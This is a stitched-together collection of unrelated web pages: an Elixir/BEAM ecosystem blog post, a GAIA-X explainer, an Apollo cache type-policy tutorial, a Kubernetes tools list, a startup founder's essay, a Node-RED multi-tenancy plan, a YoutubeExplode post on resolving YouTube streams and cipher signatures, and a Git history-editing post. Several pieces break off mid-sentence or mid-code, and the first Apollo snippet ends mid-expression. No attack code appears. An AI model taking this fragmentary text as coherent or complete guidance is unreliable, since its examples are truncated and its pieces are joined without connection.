<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I’ve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application “get to IO, don’t compute”. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn’t compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don’t think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It’s probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I’ve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I’m a hardware hobbyist, not an IoT dev but I’ve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that’s a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Saša Jurić, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I’ve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn’t replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don’t actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we’d otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don’t. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn’t BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn’t be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something …</p></article></div>

<div> <div> <p> <span>Technical Concept</span> </p> <h2> How does GAIA-X work? </h2> </div>  </div> <div> <div> <div> <p>Federated services provide value if they are based on common standards which ensure transparency and interoperability. GAIA-X addresses this requirement by aligning network and interconnection providers, Cloud Solution Providers (CSP), High Performance Computing (HPC) as well as sector specific clouds and edge systems. Here, mechanisms are developed to find, combine and connect services from participating providers in order to enable a user-friendly infrastructure ecosystem. GAIA-X identifies the minimum technical requirements and services necessary to operate the federated GAIA-X Ecosystem. The development of these services will follow the principles of Security by Design and also include the concept of Privacy by Design in order to ensure highest security requirements and privacy protection.</p> <p>Technical implementation of these Federation Services will focus on the following areas:</p> <ul><li>the implementation of secure federated identity and trust mechanisms (security and privacy by design);</li><li>sovereign data services which ensure the identity of source and receiver of data and which ensure the access and usage rights towards the data;</li><li>easy access to the available providers, nodes and services. Data will be provided through federated catalogues; </li><li>the integration of existing standards to ensure interoperability and portability across infrastructure, applications and data; </li><li>the establishment of a compliance framework and Certification and Accreditation services; and</li><li>the contribution of a modular compilation of open source software and standards to support providers in delivering a secure, federated and interoperable infrastructure.</li></ul> <p>The initial set of federation services will be expanded. The roadmap is aligned with the development of ecosystem participants’ requirements.</p> </div> </div> </div> </div> <div id="id1839168" tabindex="-1"> <div> <div> <p> <span>GAIA-X in practice</span> </p> <h2> Use Cases: GAIA-X from the user perspective </h2> </div> <p>GAIA-X gives users access to a broad and highly useful range of specialised products and services from cloud providers, thus enabling the use of tailored solutions. In this context, GAIA-X offers full transparency through the self-description, provides certified data protection and supplies regulatory criteria for the products and services offered.</p>  </div> <div> <div> <div> <p>Clear conditions for participation in GAIA-X and for collaboration, and common rules for cross-company authentication and access management will strengthen the underlying level of trust, bring down the obstacles to participation and reduce the amount of work involved in bilateral coordination between individual users.</p> <p>A further important added benefit of GAIA-X is the guarantee of data sovereignty: Each user decides for herself where her data is stored, as well as who may process it and for what purpose, based on the user’s own data classification. In that sense GAIA-X enables modular solutions. Users can also access AI applications and data pools via the trustworthy data infrastructure. Based on standardisation rules and the different options for managing and controlling the transfer of data, data can be exchanged between the companies, linked with other data, processed, evaluated, and monetised in value creation networks. The opportunities of data and service sharing can promote innovations, exploit synergies and enable new business models to be developed and scaled up. </p> <p>The aim of Workstream 1 ‘User ecosystems and requirements’ is to achieve the stated added benefits through a broad and sustained mobilisation of the user and demand perspective. This occurs through continual identification, integration, development and implementation of domain-specific use cases, which illustrate the need for and the added benefit of a sovereign European data infrastructure. The work also focuses on defining domain-specific and cross-domain requirements. These form the foundation for the growth of data infrastructures.</p> <p>In the meantime, more than 40 use cases have been submitted in eight domains (‘Industry 4.0/SME’, ‘Health’, ‘Finance’, ‘Public Sector’, ‘Smart Living’, ‘Energy’, ‘Mobility’ and ‘Agriculture’). They come from various companies and organisations from European countries, including Germany, France, the Netherlands, Spain and Switzerland. On the one hand, they illustrate need for and the added benefit of GAIA-X. On the other hand, they each represent a domain and serve as basis to identify and validate domain-specific and cross-domain requirements and to allow these to be incorporated into the development of GAIA-X.</p> <p>All project participants are invited to participate in Workstream 1 ‘User Ecosystems and Requirements’: Both by submitting new use cases and by active and continuous participation in a domain-specific working group. The establishment of further domains is welcome. Of course, use cases can also be developed and implemented outside the GAIA-X working structure.</p> </div> </div> </div> </div> <div id="id1854484" tabindex="-1"> <div> <div> <p> <span>Use Case Gallery</span> </p> <h2> GAIA-X Use Cases </h2> </div>  </div>  </div> <div id="id1838600"> <div id="accoID1838600"> <div>   <div id="collapse1838768"> <div> <div>   <div id="id1838786">  <ul data-slider-items="3|2|1"> <li> <div> <figure> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=480w" title="Icon Shared Production: werk- und firmenübergreifende Produktion als Showcase bzw.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><div><div itemprop="text"><p>Apollo InMemoryCache type policies are used to define <a target="_blank" href="https://www.apollographql.com/docs/react/local-state/managing-state-with-field-policies/#defining">field policies for local state</a>, to <a target="_blank" href="https://www.apollographql.com/docs/react/caching/cache-configuration/#customizing-identifier-generation-by-type">customize identifier generation by type</a> or to <a target="_blank" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/#merging-arrays">define a custom merge function for the cache</a>.</p>
<p>The standard way of doing this is by defining the type policies during initialization of apollo client like this:</p>
<pre><code><span>const</span> apolloClient = <span>new</span> ApolloClient({
    ...
    cache: <span>new</span> InMemoryCache({
        <span>typePolicies</span>: {
            
            <span>Article</span>: {

                    <span>isBookmarked</span>: {
                        
                        read(_, { variables }) {
                            <span>return</span> <span>localStorage</span>
                              .getItem(<span>'BOOKMARKS'</span>)
                              .includes(

</code></pre>
<p>This might not always be possible. You might want to do this at runtime instead. Some of these scenarios:</p>
<ol>
<li>If you are loading different chunks at runtime based on user interaction</li>
<li>You have a microfrontends architecture (like in our case).</li>
</ol>
<p>To do this you can follow these steps:</p>
<h3 id="1-get-an-instance-of-the-cache">1. Get an instance of the cache</h3>
<pre><code><span>const</span> { loading, error, data, client } = useQuery(QUERY);

<span>const</span> cache = client.cache
</code></pre>
<h3 id="2-add-policies-to-the-cache">2. Add policies to the cache</h3>
<p>To specify key fields for custom identifier generation</p>
<pre><code>cache.policies.addTypePolicies({
    
    <span>Book</span>: {
        <span>keyFields</span>: [<span>"isbn"</span>],
    }
})
</code></pre>
<p>Or to define field policy for local storage</p>
<pre><code>cache.policies.addTypePolicies({
    <span>Article</span>: {
        <span>fields</span>: { 
            <span>isBookmarked</span>: { 
                read(_, { variables }) { 
                    <span>return</span> <span>localStorage</span>
                      .getItem(<span>'BOOKMARKS'</span>)
                      .includes(
                        variables.articleId
                      );
                }
            }
        }
    },
})
</code></pre>
<h2 id="caveat">Caveat</h2>
<p>The reason why it is recommended to configure these at build time is because that way apollo can ensure that the data is not accessed before the type policies are defined.
If you want to do this at runtime, you need to make sure that you call <code>addTypePolicies</code> before you call <code>useQuery</code> with the query that uses the type whose policy you are modifying</p>

<h2><a id="1"></a>Introduction</h2>



<p>In the last few years, Kubernetes has laid waste to its fellow competitors in the battlefield of container orchestration. Sadly, Docker Swarm hasn’t been a major contender since 2016 and, like AWS, admitted defeat by pledging K8s support and integration.</p>



<p><span>Since Kubernetes has skyrocketed to popularity as the container solution of choice, here’s a comprehensive list of all the tools that complement K8s to further enhance your development work.</span></p>

<h3><b>15. Prometheus</b></h3>



<p><span>Prometheus monitoring has fast become the go-to tool for Kubernetes monitoring tool. It offers a multi-dimensional data model and a very user-accessible format and protocols. Exposing Prometheus metrics in Kubernetes is a pretty straightforward task. The data scraped is human readable, in a self-explanatory format, and published using a standard HTTP transport.</span></p>

<h3><b>16. Searchlight</b></h3>



<p><span>Searchlight by AppsCode is a Kubernetes operator for Icinga. Searchlight periodically runs various checks on Kubernetes clusters and alerts you via email, SMS or chat if something goes wrong. Searchlight includes a default suite of checks written specifically for Kubernetes. Also, it can enhance Prometheus monitoring with external black-box monitoring and serves as a fallback in case internal systems completely fail.</span></p>

<h3><b>17. cAdvisor</b></h3>



<p><span>CAdvisor is installed by default on all cluster nodes to collect metrics for Kubernetes about running containers and nodes. CAdvisor Kubelet exposes these metrics through Kubelet APIs (with a default of one-minute resolution). The Metrics Server identifies all available nodes and calls Kubelet API to get containers and nodes resources usage before exposing the metrics through Kubernetes aggregation API.</span></p>

Becoming a millionaire was not discussed, nor even imagined. Yet, here we are.</p><p id="acdf">Here are a few things I’ve learned from a decade of trying to make it on the internet.</p><h2 id="a6d0">Bet on yourself, but make sure it’s actually a bet</h2><p id="bcf1">The low point of (one of) my first companies was being so desperate for revenue that we adapted our<em> virtual job fair</em> platform to become a virtual business directory for a small town. For $2000/yr.</p><p id="6385">There is no upside to that. We essentially became a horribly paid consultant for an industry we didn’t care about with a product that didn’t add any value.</p><p id="f2cc">Limping along for years while eating ramen and pitching a VISION isn’t success — you’ll be much worse off than if you had just worked for a startup for a few years to improve your skills and peers.</p><p id="ce0b">To truly bet on yourself while starting a company, everything you do should accelerate any of the following:</p><ul><li id="bc69">Learning new skills: sales, product management, product development, engineering, marketing, design, fundraising</li><li id="12a6">Meeting great people — not in the “I shook Mark Cuban’s hand” sense, but in the “I have 5 equally motivated people in my corner building shit that I can text about the fact that we won’t make payroll next month.”</li><li id="c5c2">Making money on your own time</li><li id="00e0">Travelling or experiencing the world through a different lens (though in 2020 you should just get a remote job)</li></ul><h2 id="e853">Build your tribe</h2><p id="ae33">You don’t need mentors. You don’t need investors. You need 5 friends with similar ambitions trying to figure this shit out with you.</p><p id="537b">You want people that you can call when your world is falling apart. When you want to quit. When you hate your co-founders. When you’re questioning everything. When you’ve made the money, but don’t feel good about it.</p><p id="8018">It is a weird, un-relatable world that we’re playing in. To navigate it, you need people that understand. I’m so lucky I found my people.</p><p id="1451">I don’t have great advice on how to find your people.</p><p id="c46f">Join a co-working space? Get into a startup accelerator? Join a program like <a href="https://www.beondeck.com/" rel="noopener">On Deck</a>? Message people on Twitter?</p><h2 id="ba6f">Just launch something</h2><p id="64cd">I know many people who are much more talented than I. They’ve got better ideas, more technical skills, and are just plain smarter.</p><p id="1d7d">What they don’t have is that forcing function that compels me to launch stuff.</p><p id="7bb3">The shamelessness. The not-give-a-fuckery.</p><p id="2ae5">To not quit when I want to quit. I’m not sure that “chip on the shoulder” is all positive, but it’s probably necessary.</p><p id="aaf9">It’s a learned behaviour. I don’t come by it naturally. I hate failing. I suck at getting feedback. I’m overly sensitive. And yet, here we are.</p><h2 id="e2b4">It takes 3 years for anything to work</h2><p id="cccf">Every successful company I’ve seen has taken at least 3 years to get some hint of product market fit.</p><p id="1a79">Dig deeper into every company that takes off overnight — it’s probably a pivot from something else, the founder’s 8th attempt, or a hail mary. The one thing that truly worked for me was about 3.5 years in.</p><p id="8fb0">That specific thing worked in month 2, but it took 3.5 years of learning to get to that point.</p><h2 id="43a7">Check your ambitions</h2><p id="2606">My original goal when starting out (Thanks Tim Ferriss!) was to <em>“build a business making 10k a month so I could work from anywhere.”</em></p><p id="b9da">I got there, and enjoyed it — lived in multiple countries, didn’t work too much, drank great wine and ate incredible steak. It wasn’t enough.</p><p id="9d82">Financially, it didn’t matter. The cash was enough, but a life of leisure isn’t a great goal for a 30 year old. I stopped growing, learning.</p><p id="0969">Ironically, that guiding goal held me back. What seemed ambitious at the time led to unambitious decisions, like first building a below average web design company. It also led to coasting when cashflow was (very) good.</p><p id="cdd3">I somehow managed to reverse engineered my version of success, but unfortunately financial success is always a moving target — especially once you have something that works.</p><p id="0d0a">What would have been a better focus is building an exceptional product, an amazing team, and continuing to grow as a leader.</p><p id="65c1">If you can solve for those things, the score (and the cash) takes care of itself.</p><p id="6a9b">That said, if your goal is to build a company that makes 10k/mo that allows you to work from anywhere — go for it, goddamnit.</p><h2 id="1a6e">You will want to quit</h2><p id="38f1">Building something from scratch is hard, and having a job will often sound very appealing.</p><p id="9e48"><em>Here’s what you need to do today, and here’s your paycheque!</em></p><p id="a7a7">Starting a company has infinite variables. At the early stages, you’re pushing a boulder up every hill you can find. You’re trying to find that one thing that gathers enough momentum to allow you to survive another day.</p><p id="664a">If you’re lucky, you’ll get to a place where you’re no longer trying to survive — you’re trying not to die. There’s a difference.</p><p id="6c93">Every day you will have an infinite to-do list, none of which is certain.Take your best guess at what the most important thing you can work on is.</p><p id="6202">Do that thing, and try to ignore everything else.</p><p id="ee2b">Don’t forget to manage your psychology along the way. At the end of the day no one cares if you fail, and it’s not that important. Have grounding forces in your life (sports, family, knitting) to help keep you sane. Try not to build your whole identity around your company.</p><p id="950c">(You won’t do any of this, but I’m hopeful this will help you realize you’re not the only one.)</p><h2 id="52cb">You might surprise yourself</h2><p id="6c90">Most people who reach unheard of levels of success are probably not that much smarter than you, and they probably don’t work that much harder.</p><p id="d7fd">Granted, there are ridiculously smart driven people that operate on another level (Elon Musk, The Collisons). They’re likely going to be trillionaires.</p><p id="7870">I’ve met many people who have built $100m+ companies that are very smart and work very hard — but probably not that much harder than a Senior Engineer at Amazon. Success is a result of talent, hard work, and luck.</p><p id="3b30">If you’re smart, want to work hard, and care about building a business one day — the best place to put that energy is into creating something new.</p><p id="7ac5">You can’t get lucky if you’re not in the game.</p></div></div></section></div></div>]]>

	<!-- .entry-header -->

	<div>
		
<p>I was recently approached by a company that wanted to sponsor adding Multi Tenant support to Node-RED. This would be to enable multiple users to run independent flows on a single Node-RED instance.</p>



<p>This is really not a good idea for a number of reasons. But mainly it is because the NodeJS runtime is inherently single threaded and there is no way to get real separation between different users. For example, if one user uses a poorly written node (or function in a function node) it is possible to block the event loop starving out all the other users or in extreme cases an uncaught asynchronous exception will cause the whole application to exit.</p>



<p>The best approach is to run a separate instance of Node-RED per user, which gives you the required separation between users. The usual way to do this is to use a container based system and a HTTP reverse proxy to control access to the instances.</p>



<p>Over the next months worth of posts I’ll outline the components required to build a system like I described and at the end should hopefully have a fully working Proof of Concept that people can use as the base to build their own deployments.</p>



<p>As the future posts are published I will add links here.</p>



<h2>Required components</h2>



<h3>Flow Storage</h3>



<p>Because containers file systems are not persistent we are going to need somewhere to reliably store the flows each user creates.</p>



<p>Node-RED supplies an <a href="https://nodered.org/docs/api/storage/">API</a> that lets you control how/where flows (and a bunch of things that would normally end up on disk)</p>



<figure></figure>



<h3>Authentication</h3>



<p>We are going to need a way to only allow right users access to the Node-RED editor, again there is a plugin <a href="https://nodered.org/docs/user-guide/runtime/securing-node-red#custom-user-authentication">API</a> that allows this to be wired into nearly any existing authentication source of your choice.</p>



<p>I wrote a simple implementation of this API which uses <a href="https://www.hardill.me.uk/wordpress/2015/05/11/securing-node-red/" data-type="post" data-id="2075">LDAP</a> as the source of users not long after Node-RED was released . But in this series of post I’ll write a new one that uses the same backend database as the flow storage plugin.</p>



<figure></figure>



<h3>Custom Container</h3>



<p>Once we’ve built storage and authentication plugins we will need to build a custom version of the Node-RED Docker container that includes these extras.</p>



<figure></figure>



<h3>HTTP Reverse Proxy</h3>



<p>Now we have a collection of containers each running a users instance of Node-RED we are going to need a way to expose these to the outside world. Since Node-RED is a web application then a HTTP Reverse Proxy is probably the right way forward. </p>



<figure></figure>



<h3>Management</h3>



<p>Once all of the other pieces are in place we need is a way to control the creation/deletion of Node-RED instances. It will also be useful to see the instances’ logs.</p>



<figure></figure>



<h3>Extra bits</h3>



<p>Finally I’ll cover some extra bits that help make a deployment specific to a particular environment, such as</p>



<h4>Custom node repository</h4>



<p>This allows you to host your own private nodes and still install them using the Manage Palette menu.</p>



<h4>Custom Theme </h4>



<p>Tweaking page titles and colour schemes can make Node-RED fit in better with your existing look and feel.</p>



<figure></figure>



<h2>Working Example</h2>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>
<div data-language="ini"><pre><code><span>status</span><span><span>=</span>ok</span>

<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>
<span>s</span><span><span>=</span>9599599594B0133328AA570AE0129E58478D7BCE9D226F.15ABC404267945A3F64FB4E42074383FC4FA80F5</span>
<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>

<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>
<p>The DASH manifest follows <a href="http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd">this XML schema</a>. You can parse the stream metadata if you go through all descendant nodes of type <code>Representation</code>. Here’s how they appear:</p>
<div data-language="xml"><pre><code><span><span><span>&lt;</span>Representation</span> <span>id</span><span><span>=</span><span>"</span>133<span>"</span></span> <span>codecs</span><span><span>=</span><span>"</span>avc1.4d4015<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>426<span>"</span></span>

<article>
    
    

    <div>
      <p>This is the second post in a series to expand on various utilities I wrote to
assist my work with Git.  Some of these utilities are located in a repository
on Github called <a href="https://github.com/da-x/misc-gitology">misc-gitology</a>.</p>
<p>Previous post: <a href="https://blog.aloni.org/posts/gitology-1-git-flip-history">#1</a>.</p>
<p>Today I'll introduce the commit rewriter - <code>git-retext</code>.</p>
<h2 id="familiar-ways-of-git-history-editing">Familiar ways of Git history editing</h2>
<p>In the previous post I mentioned the desire to present a clear Git history to
reviewers. Sometimes, we are reviewing our own unpublished Git history and
would like to do some polishing here and there before pushing it to a
remote repository.</p>
<p>There are multitude of ways in which editing the history can be done:</p>
<ul>
<li><code>git commit --amend</code>, with or without <code>-a</code> (in the later <code>git add</code> is used). This
takes care of the <code>HEAD</code> commit, but not commits that are earlier to it.</li>
<li><code>git rebase</code>, where you labor on a fixup commit or a set of them,
with or without <code>--interactive</code>, with or without <code>--autosquash</code>, so that
the fixup changes amend commits further down the history. There are tools such
as <a href="https://github.com/tummychow/git-absorb">git-absorb</a> that can be used to
automate creation of fixup commits.</li>
<li><code>git-filter-branch</code>, a big hammer that lets you run a command per a commit,
